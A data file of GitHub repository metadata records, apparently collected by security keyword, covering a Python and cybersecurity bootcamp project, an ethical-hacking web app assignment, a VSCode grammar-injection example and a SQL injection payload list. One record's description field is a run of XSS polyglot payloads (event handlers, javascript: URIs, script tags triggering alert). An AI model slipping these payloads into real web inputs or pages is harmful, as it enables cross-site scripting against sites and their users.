{
    "commits_count": 2,
    "date_started": "2021-06-22",
    "date_updated": "2021-06-22",
    "description": "&amp;&#35;35; SHAPEAI Python and Cybersecurity BOOTCAMP Hi I made this project during the 7 Days Free Bootcamp, conducted by &amp;lt;b&amp;gt; SHAPEAI &amp;lt;/b&amp;gt;. The instructor during the session was Mr. Harsh Akshit (Student Lead at Google). I got to learn a lot during these 7 days and it was an amazing experience learning with SHAPEAI. &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;Here's the link for you to watch the sessions as well&amp;lt;br&amp;gt; &amp;lt;a href=&amp;quot;https://www.youtube.com/playlist?list=PL7zl8TDRnbulLetcbkthT0p_IzwgRAYbu&amp;quot;&amp;gt; &amp;lt;img src=&amp;quot;https://github.com/ShapeAI/PYTHON-AND-CYBERSECURITY/blob/main/YOUTUBE%20THUMBNAIL-4.png&amp;quot;&amp;gt; &amp;lt;/a&amp;gt; &amp;lt;br&amp;gt;I got to have hands on experience on: &amp;lt;li&amp;gt;Python &amp;lt;li&amp;gt;Selenium for web automation &amp;lt;li&amp;gt;SQL Injection &amp;lt;li&amp;gt;Solving Capture the flag on hacker101 &amp;lt;li&amp;gt;Vulnerability Assessment and Penetration testing[VAPT] &amp;lt;br&amp;gt;during these 7 days, and everything was explained from the very basics so that anyone with zero experience on prog...",
    "forks_count": 0,
    "html_url": "https://github.com/SafiaImtiaz/Python_And_Cybersecurity",
    "keywords": [
        "session vulnerability"
    ],
    "language": "Jupyter Notebook",
    "repo_name": "Python_And_Cybersecurity",
    "repo_owner": "SafiaImtiaz",
    "repotime": "2021-06-22, 01:07:00",
    "stargazers_count": 0,
    "watchers_count": 0
}
{
    "commits_count": 4,
    "date_started": "2021-06-15",
    "date_updated": "2021-06-16",
    "description": "Project Requirements Create a web application with the following requirements.  Landing page The website should have a static webpage with buttons to login page as well as register register page Registration form should contain the following fields. Name email address password password confirmation Password and Password confirmation check should be done before inserting into the database, otherwise it should throw an error Details for the user table in the database have been provided below. Choose a primary key for your database. id - int Name - varchar(30) email address - varchar (40) password - varchar(40) Login page Registered users should be able to login with their email and password Proper client side checking should be added to check whether the user has entered the email in correct format or not. Proper session management (Cookies) should also be implemented Home page Once logged in, User should be greeted with a text containing their Name This page should have a text box and u...",
    "forks_count": 1,
    "html_url": "https://github.com/cyber-pignus/Ethical-Hacking-Project",
    "keywords": [
        "cross-side-scripting",
        "session vulnerability"
    ],
    "language": "PHP",
    "repo_name": "Ethical-Hacking-Project",
    "repo_owner": "cyber-pignus",
    "repotime": "2021-06-16, 01:32:16",
    "stargazers_count": 0,
    "watchers_count": 0
}
{
    "commits_count": 3,
    "date_started": "2021-06-12",
    "date_updated": "2021-06-12",
    "description": "&amp;quot; onmouseover=alert(9205) bad=&amp;quot; &amp;quot;/&amp;gt;jaVasCript:/*-/*`/*\\`/*'/*&amp;quot;/**/(/* */oNcliCk=prompt() )//%0D%0A%0d%0a//&amp;lt;/stYle/&amp;lt;/titLe/&amp;lt;/teXtarEa/&amp;lt;/scRipt/--!&amp;gt;\\x3csVg/&amp;lt;sVg/oNloAd=prompt(123)//&amp;gt;\\x3e jaVasCript:/*-/*`/*\\`/*'/*&amp;quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&amp;lt;/stYle/&amp;lt;/titLe/&amp;lt;/teXtarEa/&amp;lt;/scRipt/--!&amp;gt;\\x3csVg/&amp;lt;sVg/oNloAd=alert()//&amp;gt;\\x3e &amp;quot; onclick=alert(1)//&amp;lt;button ' onclick=alert(1)//&amp;gt; */ alert(1)// jaVasCript:/*-/*`/*\\`/*'/*&amp;quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&amp;lt;/stYle/&amp;lt;/titLe/&amp;lt;/teXtarEa/&amp;lt;/scRipt/--!&amp;gt;\\x3csVg/&amp;lt;sVg/oNloAd=alert()//&amp;gt;\\x3e ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//&amp;quot;;alert(String.fromCharCode (88,83,83))//&amp;quot;;alert(String.fromCharCode(88,83,83))//-- &amp;gt;&amp;lt;/SCRIPT&amp;gt;&amp;quot;&amp;gt;'&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83)) &amp;lt;/SCRIPT&amp;gt; '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;...",
    "forks_count": 1,
    "html_url": "https://github.com/testnsh/lol",
    "keywords": [
        "xml external entity"
    ],
    "language": null,
    "repo_name": "lol",
    "repo_owner": "testnsh",
    "repotime": "2021-06-12, 16:11:44",
    "stargazers_count": 3,
    "watchers_count": 3
}
{
    "commits_count": 18,
    "date_started": "2017-04-12",
    "date_updated": "2021-06-10",
    "description": "Example of injecting a new grammar into VSCode's builtin markdown syntax highlighting for fenced code blocks ",
    "forks_count": 28,
    "html_url": "https://github.com/mjbvz/vscode-fenced-code-block-grammar-injection-example",
    "keywords": [
        "code injection"
    ],
    "language": null,
    "repo_name": "vscode-fenced-code-block-grammar-injection-example",
    "repo_owner": "mjbvz",
    "repotime": "2021-06-10, 14:43:18",
    "stargazers_count": 104,
    "watchers_count": 104
}
{
    "commits_count": 16,
    "date_started": "2019-10-30",
    "date_updated": "2021-06-09",
    "description": "ðŸŽ¯ SQL Injection Payload List",
    "forks_count": 1288,
    "html_url": "https://github.com/payloadbox/sql-injection-payload-list",
    "keywords": [
        "sql injection"
    ],
    "language": null,
    "repo_name": "sql-injection-payload-list",
    "repo_owner": "payloadbox",
    "repotime": "2021-06-09, 20:45:57",
    "stargazers_count": 5548,
    "watchers_count": 5548
}
